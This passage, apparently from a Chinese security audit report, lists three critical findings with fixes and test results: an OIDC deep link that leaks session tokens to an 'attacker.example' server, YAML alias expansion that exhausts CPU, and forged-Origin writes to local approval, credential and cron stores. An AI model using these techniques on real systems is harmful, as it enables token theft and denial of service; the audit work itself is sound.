## 二、P0 与高价值 P1

### P0-1 · OIDC 深链把真实 token 交给 `?server=` 指定的任意地址

`?server=` 只校验 scheme（https 或回环 http），302 到
`picoaide://auth?token=<真token>&server=https://attacker.example`；客户端在换端守卫
**之前**就 `fetchJSON(session.serverURL, '/auth/me', {token})`。时序证据：token 在
T+49ms 已发出，守卫在 T+361ms 才判定。token 90 天有效，等同员工全部员工面权限。

受害者只需点一个**指向真实服务端域名**的链接并在真实 IdP 完成 SSO —— 不需要假登录页、
不需要密码，SSO/MFA 用户同样中招。

修复：服务端只接受来自服务端配置（`PICOAI_PUBLIC_BASE_URL` / `PICOAI_TRUSTED_HOSTS` /
redirect_url）的来源；客户端把换端判定提到任何网络请求之前，并在 `apply()` **同步**进入
严格模式（官方无预置地址构建同样严格，同时消除启动竞争窗口）。登记面带持有性证明。

### P0-2 · 编排解析闸门可被 573 字节 YAML 换 131 秒 CPU

为「审核面必须能读到编排内容」而新增的解析闸门按**文本字符**计预算，但 YAML 别名
（`&`/`*`）与 merge key（`<<:`）的成本在解码期按 fanout^k 指数展开 —— 形状遍历只访问
`name/group/config` 三个键，合并出来的键一个都不看。实测 732 字节 → 131.7 秒，
真 HTTP `POST /api/client/v2/agent-presets` **201 入库**。

修复：解析前结构扫描（正确判定「标量开头的引号」，此前一个撇号 `don't` 即关掉全部闸门）
+ merge key 展开预算 + 2 秒墙钟 deadline + 节点预算。15 种等价形态实测全部 ≤1ms 拒绝；
合法编排（上游 16 份真实 preset + 9 份自写大提示词）零误伤。

### P0-3 · 回环写面无持有性证明（家族，跨 4 个包）

`/api/pico/browser`、`/api/pico/connectors`、`/api/cron/action`、
`/api/pico/desktop/update/*` 只校验「回环 origin 标记」——**其自身注释就写着边界是
「伪造 Origin 的 curl 也能过」**。本机任意进程据此可：
- 把攻击者 token 写进本地连接器凭据库；
- 往 `.mcp-approvals.json` 写入持久化的「允许在本机执行 `<command> <args>`」审批
  （**跨重启生效，绕过本地命令必须用户确认的闸门**）；
- 持久化定时任务并立即执行（`ledger.json` 落盘 + `executions[]` 记账）；
- 驱动用户已登录的浏览器执行 eval/navigate。

修复：把 enterprise 已有的口径（`proofOfPossession` + `requestRejection()` 的 HMAC
BrowserAuth cookie，fail-closed）接到四个包的全部写面；读面维持原 guard。
等价伪造 8 种 × 7 条路由实测 56/56 全拦，持真 cookie 的正常请求零误伤。

## 四、已知残留（未修，如实记录）

- **伪造魔数 + 非可打印载荷**在 ≤512KiB/请求 内仍会被折算，少收上界约 131K token/请求；
  超过该预算必须构造出结构合法的容器（等于真的在传媒体）。
- **Pure 文本长上下文**在上游漏报 usage 时受 131072 上限约束（已优先取模型配置的
  上下文窗口；无配置时少收最多 8×，是刻意的「宁可少收也不凭空放大」取舍）。
- **`SetMaxIdleConns(100) > SetMaxOpenConns(93)`**：`database/sql` 自动收敛，无实际影响。
- **持有性证明已存在 4 份同形副本**（browser/connectors/cron/desktop），应收敛进
  `@deepseek-ai/dsh-host-webserver`（需该包 owner）。
- **`packages/host/enterprise` 的 `agent-preset-install.spec.ts`** 断言上游
  `@deepseek-ai/dsh-agent-presets` 的 Config schema 形状，与本轮无关但会让 CI gate 红，
  建议单独立项。
- 安装的 `@deepseek-ai/*` 是 `0.1.2-rc.1` 而 pin 是 `0.1.5-rc.2` ⇒ connectors 的
  `src/client/index.ts:83 TS2322` 与 desktop 的 10 项失败为环境问题（需 `yarn install`
  应用 patches）。
